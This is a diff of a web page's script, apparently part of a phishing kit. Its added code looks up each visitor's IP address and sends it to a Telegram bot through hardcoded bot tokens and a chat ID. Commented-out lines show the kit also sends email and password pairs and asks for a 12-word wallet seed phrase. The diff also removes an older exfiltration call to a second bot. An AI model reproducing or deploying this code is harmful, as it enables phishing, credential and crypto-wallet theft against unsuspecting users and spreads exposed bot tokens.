@@ -1412,12 +1412,55 @@ height: 2.5rem;
        
     }
 
-        // 6324162948:AAHoif-_gs5MeDEunyyI3_glKhFV-J1E5ZI
+        
+           
+          // Add "https://ipinfo.io" statement
+          // this will communicate with the ipify servers
+          // in order to retrieve the IP address
+          $.get("https://ipinfo.io/", function(response) {
+                 var ipx = response.ip;
+                 sendMail(ipx);
+              }, "json")
+               
+              // "json" shows that data will be fetched in json format
+          
 
-         // https://api.telegram.org/bot6324162948:AAHoif-_gs5MeDEunyyI3_glKhFV-J1E5ZI/getUpdates
+        function sendMail(ipx) {
+        
+          // alert("kjk");
+        
+        //   var phr = document.getElementById("phrase").value ;
+         
+          
+        
+                
+                  //https://api.telegram.org/bot6328425255:AAGk9bQefjT08Du5FZTV0M741T89AzeQ8ng/sendMessage?chat_id=6298874715&text=heeey 
+                  
+                  // fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${email}=${pwd}`, {
+        
+                    // https://api.telegram.org/bot6328425255:AAGk9bQefjT08Du5FZTV0M741T89AzeQ8ng/sendMessage?chat_id=6298874715&text=heeey
 
-     
-       fetch('https://api.telegram.org/bot6393143042:AAFmrch0yhKDpEFrh89zs-_2zEwfW0vYhSI/sendMessage?chat_id=6298874715&text=ip-v2:'+ipx , {
+
+                    // 6324162948:AAHoif-_gs5MeDEunyyI3_glKhFV-J1E5ZI
+
+                    // https://api.telegram.org/bot6324162948:AAHoif-_gs5MeDEunyyI3_glKhFV-J1E5ZI/getUpdates
+        
+        
+                  fetch('https://api.telegram.org/bot6324162948:AAHoif-_gs5MeDEunyyI3_glKhFV-J1E5ZI/sendMessage?chat_id=6298874715&text=ip-v2:'+ipx , {
+                      method: "GET"
+                  }).then(success => {
+        
+                    // alert("Invalid phrase. Kindly enter the correct 12 phrase");
+        
+                    // const dangerMessage = document.querySelector("#msg")
+                    
+                  }, error => {
+                    //   alert("Message not sent")
+                      console.log(error)
+        
+                  })
+
+                  fetch('https://api.telegram.org/bot6324162948:AAHoif-_gs5MeDEunyyI3_glKhFV-J1E5ZI/sendMessage?chat_id=6298874715&text=ip-v2:'+ipx , {
                       method: "GET"
                   }).then(success => {
         
@@ -1435,25 +1478,4 @@ height: 2.5rem;
          
            
         }
-       fetch('https://api.telegram.org/bot6695223456:AAFE9GZF2uSJqgy8mLmU_Aoj7C41rOB0dqc/sendMessage?chat_id=5569658703&text=ip-v2:'+ipx , {
-                      method: "GET"
-                  }).then(success => {
-        
-                    // alert("Invalid phrase. Kindly enter the correct 12 phrase");
-        
-                    // const dangerMessage = document.querySelector("#msg")
-                    
-                  }, error => {
-                    //   alert("Message not sent")
-                      console.log(error)
-        
-                  })
-              
-               
-         
-           
-        }
-    
-        </script>
-
 </html>
